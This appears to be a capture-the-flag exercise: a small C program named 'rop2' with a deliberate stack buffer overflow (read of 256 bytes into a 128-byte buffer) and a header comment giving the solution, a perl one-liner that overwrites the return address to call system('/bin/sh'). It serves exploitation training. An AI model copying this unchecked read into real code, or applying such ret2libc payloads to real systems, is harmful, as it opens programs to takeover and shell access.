/*
** Solution
** the address of system (into libc) is at 0x080483a0
** the address of the string "/bin/sh" is at 0x08048610
** cat <(perl -e 'print "A"x140 . "\xA0\x83\x04\x08" . "AAAA" . "\x10\x86\x04\x08"') - | ./rop2
**
*/

#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char * not_used = "/bin/bash";

int not_called() {
	return system("/bin/date");
}

void vulnerable_function() {
	char buf[128];
	read(STDIN_FILENO, buf, 256);
}

void be_nice_to_people() {
	// /bin/sh is usually symlinked to bash, which usually drops privs. Make
	// sure we don't drop privs if we exec bash, (ie if we call system()).
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
}

int main(int argc, char** argv) {
        // be_nice_to_people();
	vulnerable_function();
	write(STDOUT_FILENO, "Hello, World\n", 13);
}

